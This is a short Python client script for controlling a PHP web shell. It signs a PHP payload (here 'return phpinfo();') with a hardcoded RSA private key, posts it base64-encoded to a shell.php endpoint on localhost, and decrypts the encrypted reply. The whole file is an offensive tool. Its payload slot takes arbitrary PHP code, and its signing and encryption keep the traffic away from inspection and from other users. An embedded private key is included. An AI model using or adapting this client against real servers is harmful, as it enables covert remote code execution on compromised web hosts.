# pip install rsa
# Author: CBiu
import rsa
import base64
import requests

PRIV_KEY = '''-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgHw6fTCgWdoCEau6H5YDp66rH02UAhhaBNFspmqSZCsBpYK+c6Ly
KlYRMYGGNlF7UA5cXAvcZFHHKoaQaHrPqrZ8hPCgE2cjsYrzeUR79c/8rCQ6Bndc
F6CkRz15yaNmY7h8iknq3AofDEIG2O7y0IvJyOT50ebw7kIG4S1/aHiNAgMBAAEC
gYAH7tA5v7OdKU6pkawcr0UQ8VqBYLc1iOIP4YlK+ugsmuFP1QubVy1+64AmzkQ/
tckp8ZnrI/rAAiDkEOqrFQHIqHWscsMz8Tg/e5G8zrpZ/IDIX2AMMMxeVPGeTD5z
nw7o3aClT/mXJKp37RRy+l283QxssAKaloeVVD35Yd15gQJBAMv1AQddrh/dcp43
H77fw7w+ZX812AysFZkTgKfNc0qonRK5nX5L3r1XVQKdiQesEBsbRbNSmE59pg4v
7zw4yO0CQQCb7Wkdxx0A4XLQ3wYQRMzD5iMKT7NiOfyecYFe4HxbcD0V6yoH8WyD
UDPRnutnlNcGAzdhdLAh+Hp14/oRGJohAkEAyO6dzdjv83qiMdbS0qP2XN0H9zRf
ndRnDsDU7fwNCk9lN45f543taZHBMWtsFX/g+iN7HnhPjnxg/PcidKzo3QJAfZ5Q
dxr4dMMsOrXSLr0eshvv0tjOza2lpQgQj50O0qOjssrX+7o2D7xHYvNC9xnj+QYS
UcMuOs/x6JQX3DoTwQJASa60jvd9iF8fFsxfUylZt5nmpMxXao3cvem8yOG9bedz
P3rcz92tLUWvH6ggZBhGB+ABJFbmeB8ILIfGmHDChw==
-----END RSA PRIVATE KEY-----'''

payload = '''
return phpinfo();
'''

priv_key = rsa.PrivateKey.load_pkcs1(PRIV_KEY.encode())

sign = rsa.sign(payload.encode(), priv_key, 'SHA-1')

data = {
	"s": base64.b64encode(payload),
	"sign": base64.b64encode(sign)
}

r = requests.post("http://localhost/shell.php", data=data)

crypted = base64.b64decode(r.content)

result = ""
for i in range(len(crypted) / 128):
	result += rsa.decrypt(crypted[i*128:(i+1)*128], priv_key).decode()

print(result)
